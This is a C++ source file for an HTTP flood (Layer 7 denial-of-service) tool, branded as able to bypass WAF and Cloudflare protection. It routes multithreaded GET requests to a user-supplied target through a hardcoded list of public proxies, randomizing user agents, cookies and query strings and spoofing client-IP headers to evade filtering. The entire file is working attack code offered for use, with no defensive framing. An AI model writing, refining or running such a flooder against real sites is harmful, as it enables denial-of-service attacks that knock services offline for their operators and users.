#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <cstring>
#include <sstream>
#include <iomanip>
#include <atomic>
#include <mutex>
#include <ctime>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define CLOSE closesocket
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#define CLOSE close
#endif

#include <openssl/ssl.h>
#include <openssl/err.h>

const char* asciiArt = R"(⠀⠀⢀⣶⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢾⡲⣟⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⠻⣦⡃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠙⣷⣕⢄⡀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠹⣷⣌⠹⢷⣟⡦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠛⢷⣏⠻⣯⣏⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣄⡿⣿⣼⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣿⣿⣦⡕⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣟⣿⣾⣽⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣝⢿⣶⡿⣧⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣟⣼⠯⣭⢷⣽⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡿⣿⣯⣻⣿⣿⢯⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣟⣦⡐⢮⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⢟⣷⣝⡶⣕⢩⢃⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣷⣝⣿⡟⣿⣷⣍⠶⡐⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣤⣴⣾⣿⣿⣿⣿⣾⡷⣎⣳⣿⣷⣬⠳⣑⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣿⣷⣮⣽⡙⢷⣵⣮⡣⣔⡠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠉⠀⠠⢻⠋⠀⠙⣿⢦⡙⢿⣷⢦⡙⢫⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠙⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⢋⡟⡿⡤⠙⢷⣿⢦⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣽⣿⣷⣟⢿⣤⢝⣷⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠛⠘⢽⣼⣿⣯⣂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣟⡾⠁⠀⠀⠈⢿⣿⣿⣿⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣽⢹⠁⠀⠀⠀⠀⠈⣿⣿⡟⡖⡌⠉⢢⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠹⣿⣝⣋⢆⠀⠀⠣⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣼⡢⡄⢒⠀⠉⢆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡼⣷⡆⡀⢀⠥⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⡞⣿⡬⣁⡂⡙⢤⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣮⢿⣵⢮⣷⠿⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡾⠋⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⠟⠁⠀⠀⠀⠀⠀
Layer 7 + bypass waf and bypass cloudflare + proxy rotation)";

std::vector<std::string> uas = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
};

std::vector<std::string> proxies = {
    "38.41.12.88:999", "89.208.107.167:1080", "206.189.88.243:8080",
    "38.156.75.227:8080", "94.154.127.96:8085", "184.178.172.13:15311",
    "8.213.222.157:9080", "197.221.240.240:80", "185.54.178.193:1080",
    "49.48.47.72:8080", "66.29.128.241:12795", "8.211.194.85:3128",
    "198.105.100.215:6466", "45.67.215.7:80", "23.236.188.20:3128",
    "172.67.129.0:80", "47.251.73.54:8443", "75.119.141.230:27666",
    "217.144.185.242:22578", "199.233.238.6:4238", "205.185.116.159:5556",
    "198.105.122.94:6667", "78.9.232.205:8080", "209.50.172.135:3129",
    "72.210.221.197:4145", "190.119.160.26:59842", "103.229.252.67:1080",
    "80.78.70.253:65530", "46.202.227.181:6175", "146.103.56.9:5557",
    "203.205.33.131:1452", "129.226.148.192:443", "45.67.215.167:80",
    "27.75.153.175:1080", "199.102.106.94:4145", "219.249.37.107:8382",
    "41.190.57.66:5678", "202.150.148.218:61924", "181.78.17.191:999",
    "175.229.79.45:999", "103.189.63.149:56457", "93.177.94.59:8085",
    "184.174.46.240:5869", "5.61.62.24:8118", "31.59.20.28:6606",
    "162.220.247.45:6640", "136.0.120.163:6181", "142.111.44.9:5721",
    "103.174.178.133:1020", "162.144.74.156:3620"
};

std::atomic<int64_t> sent(0);
std::atomic<bool> running(true);
int threads = 0;
double delay = 1.0;
std::string target;
std::string host;
std::string path;
int port = 80;
bool isHttps = false;
std::mutex printMutex;

std::string rs(int length) {
    const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    for (int i = 0; i < length; i++) {
        result += chars[rand() % 62];
    }
    return result;
}

std::string rip() {
    return std::to_string(rand() % 254 + 1) + "." +
           std::to_string(rand() % 254 + 1) + "." +
           std::to_string(rand() % 254 + 1) + "." +
           std::to_string(rand() % 254 + 1);
}

std::string buildPacket(const std::string& host, const std::string& path) {
    std::string ua = uas[rand() % uas.size()];
    std::string xff = rip();
    std::string cf = rip();
    std::string q = rs(8) + "=" + rs(16);
    std::string ck = rs(12) + "=" + rs(24);
    std::string auth = "Bearer " + rs(32);
    std::string xid = rs(16);
    std::string xreq = rs(16);
    std::string xtr = rs(32);
    std::string xsp = rs(16);

    std::ostringstream oss;
    oss << "GET " << path << "?" << q << " HTTP/1.1\r\n";
    oss << "Host: " << host << "\r\n";
    oss << "User-Agent: " << ua << "\r\n";
    oss << "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n";
    oss << "Accept-Language: en-US,en;q=0.9\r\n";
    oss << "Accept-Encoding: gzip, deflate\r\n";
    oss << "Connection: keep-alive\r\n";
    oss << "Upgrade-Insecure-Requests: 1\r\n";
    oss << "Sec-Fetch-Dest: document\r\n";
    oss << "Sec-Fetch-Mode: navigate\r\n";
    oss << "Sec-Fetch-Site: none\r\n";
    oss << "Sec-Fetch-User: ?1\r\n";
    oss << "Cache-Control: max-age=0\r\n";
    oss << "Pragma: no-cache\r\n";
    oss << "X-Forwarded-For: " << xff << "\r\n";
    oss << "CF-Connecting-IP: " << cf << "\r\n";
    oss << "X-Real-IP: " << rip() << "\r\n";
    oss << "True-Client-IP: " << rip() << "\r\n";
    oss << "X-Client-IP: " << rip() << "\r\n";
    oss << "X-Forwarded-Proto: https\r\n";
    oss << "X-Forwarded-Host: " << host << "\r\n";
    oss << "X-Forwarded-Port: 443\r\n";
    oss << "X-Forwarded-Server: " << host << "\r\n";
    oss << "X-Originating-IP: " << rip() << "\r\n";
    oss << "X-Remote-IP: " << rip() << "\r\n";
    oss << "X-Remote-Addr: " << rip() << "\r\n";
    oss << "X-Custom-Request-ID: " << xid << "\r\n";
    oss << "X-Request-ID: " << xreq << "\r\n";
    oss << "X-Trace-ID: " << xtr << "\r\n";
    oss << "X-Span-ID: " << xsp << "\r\n";
    oss << "Cookie: " << ck << "\r\n";
    oss << "Authorization: " << auth << "\r\n";
    oss << "Origin: https://" << host << "\r\n";
    oss << "Referer: https://www.google.com/search?q=" << rs(8) << "\r\n";
    oss << "DNT: 1\r\n";
    oss << "TE: trailers\r\n";
    oss << "X-Requested-With: XMLHttpRequest\r\n";
    oss << "Priority: u=0, i\r\n";
    oss << "Viewport-Width: " << (rand() % 1121 + 800) << "\r\n";
    oss << "Device-Memory: " << (std::vector<int>{2, 4, 8, 16})[rand() % 4] << "\r\n";
    oss << "Downlink: " << std::fixed << std::setprecision(1) << ((rand() % 9500) / 1000.0 + 0.5) << "\r\n";
    oss << "ECT: " << (std::vector<std::string>{"4g", "3g", "2g"})[rand() % 3] << "\r\n";
    oss << "RTT: " << (rand() % 181 + 20) << "\r\n";
    oss << "Save-Data: " << (std::vector<std::string>{"on", "off"})[rand() % 2] << "\r\n";
    oss << "Sec-CH-UA: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"" << (rand() % 11 + 110) << "\", \"Google Chrome\";v=\"" << (rand() % 11 + 110) << "\"\r\n";
    oss << "Sec-CH-UA-Mobile: ?" << rand() % 2 << "\r\n";
    oss << "Sec-CH-UA-Platform: \"Windows\"\r\n";
    oss << "Sec-CH-UA-Platform-Version: \"10.0\"\r\n";
    oss << "Sec-CH-UA-Full-Version-List: \"Not_A Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"" << (rand() % 11 + 110) << ".0.0.0\"\r\n";
    oss << "Sec-CH-UA-Arch: \"x86_64\"\r\n";
    oss << "Sec-CH-UA-Bitness: \"64\"\r\n";
    oss << "Sec-CH-UA-Model: \"\"\r\n";
    oss << "Sec-CH-UA-WoW64: ?0\r\n";
    oss << "\r\n";
    return oss.str();
}

bool connectProxy(const std::string& proxy, int& proxyFd) {
    size_t colon = proxy.find(':');
    if (colon == std::string::npos) return false;
    std::string pHost = proxy.substr(0, colon);
    int pPort = std::stoi(proxy.substr(colon + 1));

    proxyFd = socket(AF_INET, SOCK_STREAM, 0);
    if (proxyFd < 0) return false;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(pPort);
    inet_pton(AF_INET, pHost.c_str(), &addr.sin_addr);

    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    setsockopt(proxyFd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(proxyFd, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    if (connect(proxyFd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        CLOSE(proxyFd);
        return false;
    }
    return true;
}

bool proxyConnectHTTP(int proxyFd, const std::string& targetHost, int targetPort) {
    std::string req = "CONNECT " + targetHost + ":" + std::to_string(targetPort) + " HTTP/1.1\r\nHost: " + targetHost + ":" + std::to_string(targetPort) + "\r\n\r\n";
    send(proxyFd, req.c_str(), req.length(), 0);
    char buf[1024];
    int n = recv(proxyFd, buf, sizeof(buf) - 1, 0);
    if (n > 0) {
        buf[n] = '\0';
        return strstr(buf, "200") != nullptr;
    }
    return false;
}

void hammer() {
    while (running) {
        std::string proxy = proxies[rand() % proxies.size()];
        int proxyFd = -1;
        if (!connectProxy(proxy, proxyFd)) continue;

        if (!proxyConnectHTTP(proxyFd, host, port)) {
            CLOSE(proxyFd);
            continue;
        }

        SSL_CTX* ctx = nullptr;
        SSL* ssl = nullptr;
        if (isHttps) {
            ctx = SSL_CTX_new(TLS_client_method());
            SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);
            ssl = SSL_new(ctx);
            SSL_set_fd(ssl, proxyFd);
            SSL_set_tlsext_host_name(ssl, host.c_str());
            if (SSL_connect(ssl) <= 0) {
                SSL_free(ssl);
                SSL_CTX_free(ctx);
                CLOSE(proxyFd);
                continue;
            }
        }

        std::string pkt = buildPacket(host, path);
        if (isHttps) {
            SSL_write(ssl, pkt.c_str(), pkt.length());
        } else {
            send(proxyFd, pkt.c_str(), pkt.length(), 0);
        }

        sent++;

        if (isHttps) {
            SSL_shutdown(ssl);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
        }
        CLOSE(proxyFd);

        std::this_thread::sleep_for(std::chrono::duration<double>(delay));
    }
}

void printStatus() {
    while (running) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        std::lock_guard<std::mutex> lock(printMutex);
        std::system("clear || cls");
        std::cout << asciiArt << "\n";
        time_t now = time(nullptr);
        tm* ltm = localtime(&now);
        std::cout << "\n  " << ltm->tm_wday << " " << ltm->tm_mon + 1 << " " << ltm->tm_mday << " " << ltm->tm_hour << ":" << ltm->tm_min << ":" << ltm->tm_sec << " " << (ltm->tm_year + 1900) << "\n";
        std::cout << "  <--packet sent! hammering-->\n";
        std::cout << "\n  bot is hammering...\n";
        std::cout << "  bot is hammering...\n";
        std::cout << "  bot is hammering...\n";
        std::cout << "\n  TARGET : " << target << "\n";
        std::cout << "  SENT   : " << sent.load() << "\n";
        std::cout << "  THREAD : " << threads << "\n";
        std::cout << "  DELAY  : " << delay << "s\n";
        std::cout << "  PROXY  : " << proxies.size() << " rotating\n";
        std::cout << "  UA     : " << uas.size() << " rotating\n";
        std::cout << "\n  Owner Rvpa\n";
    }
}

int main() {
    srand(time(nullptr));
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    std::system("clear || cls");
    std::cout << asciiArt << "\n\n";

    std::cout << "  Thread : ";
    std::cin >> threads;
    std::cout << "  Target : ";
    std::cin >> target;
    std::cout << "  Delay  : ";
    std::string delayStr;
    std::cin >> delayStr;
    delay = delayStr.empty() ? 1.0 : std::stod(delayStr);

    if (target.find("http://") == 0) {
        target = target.substr(7);
        isHttps = false;
        port = 80;
    } else if (target.find("https://") == 0) {
        target = target.substr(8);
        isHttps = true;
        port = 443;
    } else {
        isHttps = false;
        port = 80;
    }

    size_t slash = target.find('/');
    if (slash != std::string::npos) {
        host = target.substr(0, slash);
        path = target.substr(slash);
    } else {
        host = target;
        path = "/";
    }

    size_t colon = host.find(':');
    if (colon != std::string::npos) {
        port = std::stoi(host.substr(colon + 1));
        host = host.substr(0, colon);
    }

    std::cout << "\n  [+] Thread : " << threads << "\n";
    std::cout << "  [+] Target : " << host << ":" << port << path << "\n";
    std::cout << "  [+] HTTPS  : " << (isHttps ? "true" : "false") << "\n";
    std::cout << "  [+] Delay  : " << delay << "s\n";
    std::cout << "  [+] Proxy  : " << proxies.size() << " rotating\n";
    std::cout << "  [+] UA     : " << uas.size() << " rotating\n";
    std::cout << "  [+] Starting hammer...\n";
    std::this_thread::sleep_for(std::chrono::seconds(1));

    for (int i = 0; i < threads; i++) {
        std::thread(hammer).detach();
    }
    std::thread(printStatus).detach();

    while (running) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    return 0;
}
